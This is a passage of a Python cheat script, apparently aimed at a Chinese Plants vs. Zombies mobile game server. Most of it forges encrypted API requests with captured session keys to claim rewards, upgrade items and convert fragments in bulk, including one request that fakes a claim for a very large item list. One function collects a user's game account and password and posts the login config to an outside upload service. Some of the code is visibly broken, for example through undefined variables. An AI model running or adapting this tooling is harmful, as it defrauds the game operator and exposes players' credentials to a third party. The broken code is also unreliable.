    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("令营刷新成功")
    else:
        print("令营刷新失败")
    data = {"req": "V832", "e": {"id": 400000, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    for id_value in range(400000, 400080):
        data["e"]["id"] = id_value
        encrypted_data, head = get_encrypted_data(data, url)
        while True:
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print(f"僵尸升级成功")
            else:
                print(f"僵尸升级失败")
                break
def run_sixtieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    for i in range(100):
        data = {"req":"V851","e":{"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("基因抽取成功")
        else:
            print("基因抽取失败")
            break
    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if "e" not in decrypted_json or "d" not in decrypted_json.get("e", {}) or "genecl" not in decrypted_json["e"].get("d", {}):
        print("获取基因列表失败，跳过升级"); return
    genecl = decrypted_json['e']['d']['genecl']
    result = [d for d in genecl if isinstance(d["q"], (int, float)) and d["q"] > 0]
    for item in result:
        if isinstance(item["i"], int):
            item["i"] = item["i"] - 10000
        elif isinstance(item["i"], str) and item["i"].isdigit():
            item["i"] = int(item["i"]) - 10000
    for item in result:
        gi = item["i"]
        for _ in range(int(item["q"])):
            data = {"req": "V850", "e": {"gi": gi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("基因升级成功")
            else:
                print("基因升级失败")
                break

def run_sixtieth_sixth_script():
    import threading
    global ek_val
    pi, ui, sk = session.pi, session.ui, session.sk
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    pi, ui, sk = session.pi, session.ui, session.sk
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    dcl = decrypted_json["e"]["d"]["dcl"]
    ndcl = decrypted_json["e"]["d"]["ndcl"]
    dl = decrypted_json["e"]["d"]["dl"]
    ndl = decrypted_json["e"]["d"]["ndl"]
    zongji_list = dcl + ndcl
    new_dl = []
    new_ndl = []
    for num in dl:
        if num < 2000 or 100000 < num < 190000 or 10000000 < num < 90000000:
            new_num = num + 100 if num < 2000 or 100000 < num < 190000 else num + 10000000
        else:
            new_num = num
        new_dl.append(new_num)
    for num in ndl:
        if num < 2000 or 100000 < num < 190000 or 10000000 < num < 90000000:
            new_num = num + 100 if num < 2000 or 100000 < num < 190000 else num + 10000000
        else:
            new_num = num
        new_ndl.append(new_num)
    yongyou_list = set(map(str, new_dl + new_ndl))
    weiyongyou_list = [item for item in zongji_list if str(item["i"]) not in yongyou_list]
    yongyoudebansheng_list = [{"i": str(num), "q": "30"} for num in new_dl]
    yongyoudezhuangban_list = [{"i": str(num), "q": "30"} for num in new_ndl]
    merged = {}
    for item in yongyoudezhuangban_list + yongyoudebansheng_list + dcl + ndcl:
        i = str(item["i"]); q = int(item["q"])
        merged[i] = merged.get(i, 0) + q
    suipian_list = [{"i": i, "q": q} for i, q in merged.items()]
    zhuanjiyin_list = []
    for item in suipian_list:
        if item["q"] > 30:
            extra = item["q"] - 30
            if extra > 0:
                zhuanjiyin_list.append({"i": item["i"], "q": extra})
    duoyu_list = []
    for item in zhuanjiyin_list:
        duoyu_list.extend([int(item["i"])] * item["q"])
    result_list = [duoyu_list[i:i+3] for i in range(0, len(duoyu_list), 3) if len(duoyu_list[i:i+3])==3]
    if not result_list:
        print("没有可转基因的碎片"); return

    print(f"共{len(result_list)}组转基因请求，批量加密中...")
    data_list = []
    for l_list in result_list:
        d = {"req":"V907","e":{"ad":"0","is":"0","l":l_list,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
        data_list.append(json.dumps(d))
    data_to_send = json.dumps(data_list + [{"ek": ek_val}])
    try:
        er = requests.post(tx_url, data_to_send, timeout=20)
        enc_list = json.loads(er.text)
        body_list = enc_list[:-1]
    except Exception as e:
        print(f"批量加密失败: {e}"); return
    print(f"加密完成{len(body_list)}个包，开始发送")
    http_session = requests.Session()
    idx = 0; total = len(body_list)
    def _wait_cd(sec):
        t_end = time.time()+sec
        while time.time()<t_end: time.sleep(min(0.3,t_end-time.time()))
    def _reencrypt(start_idx):
        nonlocal pi,ui,sk,body_list
        global ek_val
        print("  ★ 刷新ek重加密剩余请求...")
        if not session.refresh_ek():
            print("  ★ 刷新ek失败"); return False
        pi,ui,sk = session.pi,session.ui,session.sk
        ek_val = session.ek
        rel = []
        for k in range(start_idx, len(result_list)):
            l_list = result_list[k]
            d = {"req":"V907","e":{"ad":"0","is":"0","l":l_list,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
            rel.append(json.dumps(d))
        rd = json.dumps(rel + [{"ek": ek_val}])
        try:
            rr = requests.post(tx_url, rd, timeout=20)
            nl = json.loads(rr.text)
            body_list = body_list[:start_idx] + nl[:-1]
            print(f"  ★ 重加密完成{len(nl)-1}个包"); return True
        except Exception as e:
            print(f"  ★ 重加密失败: {e}"); return False
    processed_weiyongyou = []
    while idx < total:
        item = body_list[idx]
        try:
            resp = http_session.post(and_url, headers=item["headers"], data=item["body"], timeout=10)
            resp_text = resp.text
        except Exception as e:
            print(f"第{idx+1}/{total}组 请求异常: {e}，15秒后重试"); _wait_cd(15); continue
        for ln in reversed([x.strip() for x in resp_text.split("\n") if x.strip()]):
            if ln.startswith("{"):
                try: response_data = json.loads(ln); break
                except: response_data = None
        else:
            response_data = None
        if response_data is None:
            print(f"第{idx+1}/{total}组 响应非json，15秒后重试"); _wait_cd(15); continue
        rv = response_data.get("r")
        if rv == 0:
            try:
                dec_r = get_decrypted_data(url, data=resp)
                dec_json = json.loads(dec_r)
                gl_list = dec_json["e"]["d"]["gl"]
                temp = []
                for it in weiyongyou_list:
                    try: temp.append({"i":str(it["i"]),"q":int(it["q"])})
                    except: pass
                processed_weiyongyou = temp
                for gl in gl_list:
                    gi,gq = str(gl["i"]),int(gl["q"])
                    found=False
                    for pw in processed_weiyongyou:
                        if pw["i"]==gi: pw["q"]+=gq; found=True; break
                    if not found: processed_weiyongyou.append({"i":gi,"q":gq})
                weiyongyou_list = processed_weiyongyou

                for it in weiyongyou_list:
                    if isinstance(it,dict) and it.get("q",0)>=30:
                        iid = int(it.get("i",0)); oq = it.get("q",0)
                        nid = iid
                        if iid<2000 or 100000<iid<190000 or 10000000<iid<90000000:
                            nid = iid-100 if iid<2000 or 100000<iid<190000 else iid-10000000
                        d797 = {"req":"V797","e":{"di":nid,"pi":pi,"sk":sk,"ui":ui},"ev":3}
                        ed7,hd7 = get_encrypted_data(d797,url)
                        r797 = _do_post(hd7,ed7,d797); pi,ui,sk=session.pi,session.ui,session.sk
                        rd797 = json.loads(r797.text)
                        if rd797.get("r")==0:
                            print("装扮合成成功")
                            for li in weiyongyou_list:
                                if isinstance(li,dict) and int(li.get("i",0))==iid: li["q"]=0; break
                            try:
                                dec797 = get_decrypted_data(url,data=r797); dj797=json.loads(dec797)
                                ival=str(dj797["e"]["d"]["di"])
                                plant_info = formatted_plant.get(
                                    ival,
                                    {"name": f"未知物品({ival})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"获得装扮: {color_code}{plant_name}{RESET_COLOR}")
                            except: pass
                        elif rd797.get("r")==10201: print("装扮合成异常")
                        else: print("装扮合成失败")
                for gl in gl_list:
                    ival=str(gl.get("i","?")); qv=gl.get("q",0)
                    plant_info = formatted_plant.get(
                        ival,
                        {"name": f"未知物品({ival})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得: {color_code}{plant_name}{RESET_COLOR}")
                idx += 1
            except Exception as e:
                print(f"第{idx+1}/{total}组 处理响应异常: {e}"); idx += 1
        elif rv in (20024, 20001):
            print(f"第{idx+1}/{total}组 r={rv} ek过期，刷新并重加密")
            done_ev = threading.Event(); ok=[False]
            def _bg():
                ok[0] = _reencrypt(idx); done_ev.set()
            threading.Thread(target=_bg,daemon=True).start()
            _wait_cd(15); done_ev.wait(timeout=10)
            if ok[0]:
                http_session = requests.Session()
                print(f"  ★ 从第{idx+1}组重发")
            else:
                http_session = requests.Session()
        elif rv == 20013:
            print("当前请求文本已过期，需重新抓包"); break
        elif rv == 10201:
            print(f"第{idx+1}/{total}组 转基因未知错误"); idx += 1
        else:
            print(f"第{idx+1}/{total}组 失败r={rv}，15秒后重试"); _wait_cd(15); http_session=requests.Session()
    print("转基因发送完成")

def run_sixtieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10859, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("双人状态更新成功")
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        grade = data_dict['pf']['grade']
        big = grade['big']
        small = grade['small']
        star = grade['star']
        big_rank_mapping = {0: "铜锅", 1: "银锅", 2: "金锅", 3: "钻锅", 4: "大师锅", 5: "宗师锅"}
        big_rank = big_rank_mapping[big]
        small_rank_mapping = {0: "V", 1: "IV", 2: "III", 3: "II",4:"I"}
        small_rank = small_rank_mapping[small]
        star_count = star
        print(f" 当前段位：{big_rank}{small_rank}  {star_count}星")
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        pf_data = data_dict['pf']
        print(" 与玩家对战数:", pf_data["fight_count"])
        print(" 总胜场:", pf_data["win_count"])
        print(" 满血胜利数:", pf_data["full_hp_win_count"])
        print(" 总败场:", pf_data["lost_count"])
        print(" 最高连胜数:", pf_data["con_win_max"])
        print(" 目前连胜数:", pf_data["con_win_count"])
        print(" 最高评分:", pf_data["rating_max"])
        print(" 种植植物总数:", pf_data["plat_plants"])
        print(" 击杀僵尸总数:", pf_data["kill_zombies"])
        print(" 释放僵尸总数:", pf_data["release_zombies"])
        time.sleep(0)
        fight_count = pf_data["fight_count"]
        if fight_count == 0:
            fight_count = 1
        win_rate = (fight_count - pf_data["lost_count"]) / fight_count * 100
        win_rate = "{:.2f}%".format(win_rate)
        print(f" 对人胜率: {win_rate}")
    else:
        print("双人状态更新失败")
    time.sleep(3)
def run_seventieth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10622,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("无尽刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            d_item = decrypted_json['e']['d'][0]
            nst_str = d_item['nst']
            net_str = d_item['net']
            data_dict = json.loads(d_item['data'])
            t_str = data_dict['t']
            task_bonus_list = data_dict['taskBonusList']
            task_status_list = data_dict['taskStatusList']
            nst_time = datetime.strptime(nst_str, "%Y%m%d%H%M%S")
            net_time = datetime.strptime(net_str, "%Y%m%d%H%M%S")
            t_time = datetime.strptime(t_str, "%Y-%m-%d %H:%M:%S")
            tli_list = []
            if nst_time < t_time < net_time:
                tli_list = [item['tId'] for item in task_bonus_list]
                tli_list = [tli_list[i] for i, status in enumerate(task_status_list) if status == 0]
            for tk in tli_list:
                data = {"req":"V1158","e":{"pi":pi,"sk":sk,"tk":tk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("无尽每周奖励奖励领取成功")
                else:
                    print("无尽每周奖励奖励领取失败")
    else:
        print("无尽刷新失败")
def run_seventieth_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    uk_value = decrypted_json['e']['d']['p']['uk']
    uk_value = int(uk_value)
    uki = uk_value + 1
    shijie = "safe10_hard_level_reward"
    data = {"req":"V302","e":{"nfc":"1","o":[{"i":1355,"q":2,"f":shijie},{"i":1355,"q":2,"f":shijie},{"i":1355,"q":3,"f":shijie},{"i":1355,"q":3,"f":shijie},{"i":1355,"q":3,"f":shijie},{"i":1356,"q":2,"f":shijie},{"i":1356,"q":2,"f":shijie},{"i":1356,"q":2,"f":shijie},{"i":1356,"q":2,"f":shijie},{"i":1356,"q":2,"f":shijie},{"i":1310,"q":2,"f":shijie},{"i":1310,"q":2,"f":shijie},{"i":1310,"q":3,"f":shijie},{"i":1310,"q":3,"f":shijie},{"i":1310,"q":3,"f":shijie},{"i":1311,"q":2,"f":shijie},{"i":1311,"q":2,"f":shijie},{"i":1311,"q":3,"f":shijie},{"i":1311,"q":3,"f":shijie},{"i":1311,"q":3,"f":shijie},{"i":1321,"q":2,"f":shijie},{"i":1321,"q":2,"f":shijie},{"i":1321,"q":2,"f":shijie},{"i":1321,"q":2,"f":shijie},{"i":1321,"q":2,"f":shijie},{"i":1315,"q":2,"f":shijie},{"i":1315,"q":2,"f":shijie},{"i":1315,"q":3,"f":shijie},{"i":1315,"q":3,"f":shijie},{"i":1315,"q":3,"f":shijie},{"i":1316,"q":3,"f":shijie},{"i":1316,"q":3,"f":shijie},{"i":1316,"q":4,"f":shijie},{"i":1316,"q":4,"f":shijie},{"i":1316,"q":4,"f":shijie},{"i":1322,"q":2,"f":shijie},{"i":1322,"q":2,"f":shijie},{"i":1322,"q":2,"f":shijie},{"i":1322,"q":2,"f":shijie},{"i":1322,"q":2,"f":shijie},{"i":1302,"q":1,"f":shijie},{"i":1302,"q":1,"f":shijie},{"i":1302,"q":1,"f":shijie},{"i":1302,"q":1,"f":shijie},{"i":1302,"q":2,"f":shijie},{"i":1303,"q":1,"f":shijie},{"i":1303,"q":1,"f":shijie},{"i":1303,"q":1,"f":shijie},{"i":1303,"q":1,"f":shijie},{"i":1303,"q":2,"f":shijie},{"i":1304,"q":2,"f":shijie},{"i":1304,"q":2,"f":shijie},{"i":1304,"q":2,"f":shijie},{"i":1304,"q":2,"f":shijie},{"i":1304,"q":2,"f":shijie},{"i":1301,"q":2,"f":shijie},{"i":1301,"q":2,"f":shijie},{"i":1301,"q":3,"f":shijie},{"i":1301,"q":3,"f":shijie},{"i":1301,"q":3,"f":shijie},{"i":1334,"q":2,"f":shijie},{"i":1334,"q":2,"f":shijie},{"i":1334,"q":3,"f":shijie},{"i":1334,"q":3,"f":shijie},{"i":1334,"q":3,"f":shijie},{"i":1335,"q":2,"f":shijie},{"i":1335,"q":2,"f":shijie},{"i":1335,"q":2,"f":shijie},{"i":1335,"q":2,"f":shijie},{"i":1335,"q":2,"f":shijie},{"i":1350,"q":3,"f":shijie},{"i":1350,"q":3,"f":shijie},{"i":1350,"q":4,"f":shijie},{"i":1350,"q":4,"f":shijie},{"i":1350,"q":4,"f":shijie},{"i":1305,"q":1,"f":shijie},{"i":1305,"q":1,"f":shijie},{"i":1305,"q":1,"f":shijie},{"i":1305,"q":1,"f":shijie},{"i":1305,"q":2,"f":shijie},{"i":1364,"q":6,"f":shijie},{"i":1364,"q":6,"f":shijie},{"i":1364,"q":6,"f":shijie},{"i":1364,"q":6,"f":shijie},{"i":1364,"q":6,"f":shijie},{"i":1366,"q":2,"f":shijie},{"i":1366,"q":2,"f":shijie},{"i":1366,"q":2,"f":shijie},{"i":1366,"q":2,"f":shijie},{"i":1366,"q":2,"f":shijie},{"i":1306,"q":2,"f":shijie},{"i":1306,"q":2,"f":shijie},{"i":1306,"q":3,"f":shijie},{"i":1306,"q":3,"f":shijie},{"i":1306,"q":3,"f":shijie},{"i":1378,"q":6,"f":shijie},{"i":1378,"q":6,"f":shijie},{"i":1378,"q":6,"f":shijie},{"i":1378,"q":6,"f":shijie},{"i":1378,"q":6,"f":shijie},{"i":1383,"q":2,"f":shijie},{"i":1383,"q":2,"f":shijie},{"i":1383,"q":2,"f":shijie},{"i":1383,"q":2,"f":shijie},{"i":1383,"q":2,"f":shijie},{"i":1389,"q":6,"f":shijie},{"i":1389,"q":6,"f":shijie},{"i":1389,"q":6,"f":shijie},{"i":1389,"q":6,"f":shijie},{"i":1389,"q":6,"f":shijie},{"i":1390,"q":6,"f":shijie},{"i":1390,"q":6,"f":shijie},{"i":1390,"q":6,"f":shijie},{"i":1390,"q":6,"f":shijie},{"i":1390,"q":6,"f":shijie},{"i":1394,"q":2,"f":shijie},{"i":1394,"q":2,"f":shijie},{"i":1394,"q":2,"f":shijie},{"i":1394,"q":2,"f":shijie},{"i":1394,"q":2,"f":shijie},{"i":111309,"q":6,"f":shijie},{"i":111309,"q":6,"f":shijie},{"i":111309,"q":6,"f":shijie},{"i":111309,"q":6,"f":shijie},{"i":111309,"q":6,"f":shijie},{"i":111308,"q":6,"f":shijie},{"i":111308,"q":6,"f":shijie},{"i":111308,"q":6,"f":shijie},{"i":111308,"q":6,"f":shijie},{"i":111308,"q":6,"f":shijie},{"i":1392,"q":2,"f":shijie},{"i":1392,"q":2,"f":shijie},{"i":1392,"q":2,"f":shijie},{"i":1392,"q":2,"f":shijie},{"i":1392,"q":2,"f":shijie},{"i":111327,"q":6,"f":shijie},{"i":111327,"q":6,"f":shijie},{"i":111327,"q":6,"f":shijie},{"i":111327,"q":6,"f":shijie},{"i":111327,"q":6,"f":shijie},{"i":111325,"q":6,"f":shijie},{"i":111325,"q":6,"f":shijie},{"i":111325,"q":6,"f":shijie},{"i":111325,"q":6,"f":shijie},{"i":111325,"q":6,"f":shijie},{"i":111326,"q":6,"f":shijie},{"i":111326,"q":6,"f":shijie},{"i":111326,"q":6,"f":shijie},{"i":111326,"q":6,"f":shijie},{"i":111326,"q":6,"f":shijie},{"i":111335,"q":6,"f":shijie},{"i":111335,"q":6,"f":shijie},{"i":111335,"q":6,"f":shijie},{"i":111335,"q":6,"f":shijie},{"i":111335,"q":6,"f":shijie},{"i":111336,"q":6,"f":shijie},{"i":111336,"q":6,"f":shijie},{"i":111336,"q":6,"f":shijie},{"i":111336,"q":6,"f":shijie},{"i":111336,"q":6,"f":shijie},{"i":111338,"q":6,"f":shijie},{"i":111338,"q":6,"f":shijie},{"i":111338,"q":6,"f":shijie},{"i":111338,"q":6,"f":shijie},{"i":111338,"q":6,"f":shijie},{"i":111351,"q":6,"f":shijie},{"i":111351,"q":6,"f":shijie},{"i":111351,"q":6,"f":shijie},{"i":111351,"q":6,"f":shijie},{"i":111351,"q":6,"f":shijie},{"i":111352,"q":6,"f":shijie},{"i":111352,"q":6,"f":shijie},{"i":111352,"q":6,"f":shijie},{"i":111352,"q":6,"f":shijie},{"i":111352,"q":6,"f":shijie},{"i":111356,"q":6,"f":shijie},{"i":111356,"q":6,"f":shijie},{"i":111356,"q":6,"f":shijie},{"i":111356,"q":6,"f":shijie},{"i":111356,"q":6,"f":shijie},{"i":111366,"q":6,"f":shijie},{"i":111366,"q":6,"f":shijie},{"i":111366,"q":6,"f":shijie},{"i":111366,"q":6,"f":shijie},{"i":111366,"q":6,"f":shijie},{"i":111368,"q":6,"f":shijie},{"i":111368,"q":6,"f":shijie},{"i":111368,"q":6,"f":shijie},{"i":111368,"q":6,"f":shijie},{"i":111368,"q":6,"f":shijie},{"i":111369,"q":6,"f":shijie},{"i":111369,"q":6,"f":shijie},{"i":111369,"q":6,"f":shijie},{"i":111369,"q":6,"f":shijie},{"i":111369,"q":6,"f":shijie},{"i":111391,"q":6,"f":shijie},{"i":111391,"q":6,"f":shijie},{"i":111391,"q":6,"f":shijie},{"i":111391,"q":6,"f":shijie},{"i":111391,"q":6,"f":shijie},{"i":111389,"q":6,"f":shijie},{"i":111389,"q":6,"f":shijie},{"i":111389,"q":6,"f":shijie},{"i":111389,"q":6,"f":shijie},{"i":111389,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":1398,"q":6,"f":shijie},{"i":42000160,"q":6,"f":shijie},{"i":42000160,"q":6,"f":shijie},{"i":42000160,"q":6,"f":shijie},{"i":42000160,"q":6,"f":shijie},{"i":42000160,"q":6,"f":shijie},{"i":42000170,"q":6,"f":shijie},{"i":42000170,"q":6,"f":shijie},{"i":42000170,"q":6,"f":shijie},{"i":42000170,"q":6,"f":shijie},{"i":42000170,"q":6,"f":shijie},{"i":42000180,"q":6,"f":shijie},{"i":42000180,"q":6,"f":shijie},{"i":42000180,"q":6,"f":shijie},{"i":42000180,"q":6,"f":shijie},{"i":42000180,"q":6,"f":shijie},{"i":42001380,"q":6,"f":shijie},{"i":42001380,"q":6,"f":shijie},{"i":42001380,"q":6,"f":shijie},{"i":42001380,"q":6,"f":shijie},{"i":42001380,"q":6,"f":shijie},{"i":42001370,"q":6,"f":shijie},{"i":42001370,"q":6,"f":shijie},{"i":42001370,"q":6,"f":shijie},{"i":42001370,"q":6,"f":shijie},{"i":42001370,"q":6,"f":shijie},{"i":42001820,"q":6,"f":shijie},{"i":42001820,"q":6,"f":shijie},{"i":42001820,"q":6,"f":shijie},{"i":42001820,"q":6,"f":shijie},{"i":42001820,"q":6,"f":shijie},{"i":42001340,"q":6,"f":shijie},{"i":42001340,"q":6,"f":shijie},{"i":42001340,"q":6,"f":shijie},{"i":42001340,"q":6,"f":shijie},{"i":42001340,"q":6,"f":shijie}],"pi":pi,"sk":sk,"ui":ui,"uk":uki},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("关卡装扮领取成功")
    else:
        print("关卡装扮领取失败")
def run_seventieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    shijiezhiwu = [1064, 111041, 200016, 200017, 200018, 200003, 111091, 111089, 111069, 111066, 111065, 111056, 111052, 111035, 111037, 111025, 111028, 111014, 111009, 111006, 1094, 1090, 1089, 1083, 1079, 1078, 1068, 1066, 1057, 1055, 1052, 1050, 1042, 1041, 1035, 1034, 1022, 1016, 1015, 1011, 1010, 1021, 1018, 1006, 1005, 200137, 200138, 200182, 200183, 200184, 200185, 200186]
    for i_value in shijiezhiwu:
        data = {"req": "V900", "e": {"pi": pi, "pl": [{"i": i_value, "q": 1}], "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("关卡植物领取成功")
        else:
            print("关卡植物领取失败")
def run_seventieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    bt = 0
    ct = 1
    for i in range(45):
        data = {"req":"V791","e":{"bt":str(bt),"ct":str(ct),"pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        response_data = json.loads(response.text)

        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            gifts = decrypted_json['e']['d']['l']

            for gift in gifts:
                i_value = str(gift.get('i', ""))
                q_value = gift.get('q', 0)
                plant_info = formatted_plant.get(
                    i_value,
                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} × {q_value}")
        else:
            print("获取失败")
        if (i + 1) % 3 == 0:
            bt += 1
        ct = (ct % 3) + 1
def run_seventieth_fourth_script():
    if os.name == 'posix':
        account_file_path = "/storage/emulated/0/新版账密登入.txt"
        request_file_path = "/storage/emulated/0/请求文本.txt"
    else:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        account_file_path = os.path.join(desktop_path, "新版账密登入.txt")
        request_file_path = os.path.join(desktop_path, "请求文本.txt")
    if not os.path.exists(account_file_path):
        c = input("渠道(1:官服 2:tap官服 3:好游快爆 4:4399)：").strip()
        if c == "4":
            data = {"channel_id": 54, "channelSdkVersion": "dj2.2-3.14.4.574",
                    "pt": {"token": "{\"channelUserInfo\":{\"channelUserId\":\"xxx\",\"loginToken\":\"xxx\"}}"}}
            print("请抓包后替换 token 中的 xxx")
        else:
            uid = input("账号：").strip().replace(" ", "")
            pwd = input("密码：").strip().replace(" ", "")
            if c == "1":
                data = {"channel_id": {"1":10011,"2":250,"3":261}[c],
                    "channelSdkVersion": "dj2.0-4.0.0",
                    "pt": {"userid": uid, "password": pwd}}
            elif c == "2":
                data = {"channel_id": {"1":10011,"2":250,"3":261}[c],
                    "channelSdkVersion": "dj4.0-4.10.0",
                    "pt": {"userid": uid, "password": pwd}}
            elif c == "3":
                data = {"channel_id": {"1":10011,"2":250,"3":261}[c],
                    "channelSdkVersion": "dj2.0-4.0.0",
                    "pt": {"userid": uid, "password": pwd}}

        json.dump(data, open(path, "w", encoding="utf-8"), ensure_ascii=False, indent=4)
        print("已创建，请抓包后使用")
    else:
        input("文件已存在，按回车跳过")
    try:
        with open(account_file_path, "r", encoding="utf-8") as f:
            content = f.read()
        channels_url = UPLOAD_URL
        if isinstance(content, dict) and content.get('code') == '0000':
            content = json.loads(content['content'])
            login_token = content['channelUserInfo']['loginToken']

            if login_token.endswith('4399'):

                new_config = {
                    "channel_id": 54,
                    "channelSdkVersion": "dj2.2-3.14.4.574",
                    "pt": {"token": content['content']}
                }

            else:
                print("loginToken不以4399结尾")
        elif isinstance(content, dict) and content.get('channel_id') == '10011' or '250' or '261':
            new_config = content
        else:
            print("文件格式不符合要求")
        print(new_config)
        response = requests.post(
        channels_url,
        json={
            "content": json.loads(new_config)
        },
        timeout=10
        )
        print(response.text)
        response_data = json.loads(response.text)
        print(response_data)
        if (
            response_data.get('ek')
            and 'v202_data' in response_data
            and response_data['v202_data'].get('i') == 'V202'
            and response_data['v202_data'].get('r') == 0
        ):
            root = "/storage/emulated/0/" if os.name == "posix" else os.path.join(os.path.expanduser("~"), "Desktop")
            path = os.path.join(root, "请求文本.txt")
            v202_data = response_data['v202_data']

            with open(path, 'w', encoding='utf-8') as f:
                json.dump(v202_data, f, ensure_ascii=False, indent=2)

            print(f"✅ v202_data 已成功写入：{file_path}")
        else:
            print("❌ 条件不满足，未写入文件")
    except FileNotFoundError:
        print(f"错误：文件未找到 - {account_file_path}")
    except requests.exceptions.RequestException as e:
        print(f"网络请求失败：{str(e)}")
    except json.JSONDecodeError:
        print("错误：无法解析响应为JSON格式")
    except Exception as e:
        print(f"操作失败：{str(e)}")
def run_seventieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10833,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data = {"req":"V956","e":{"pi": pi,"sk": sk,"ui": ui},"ev":3}
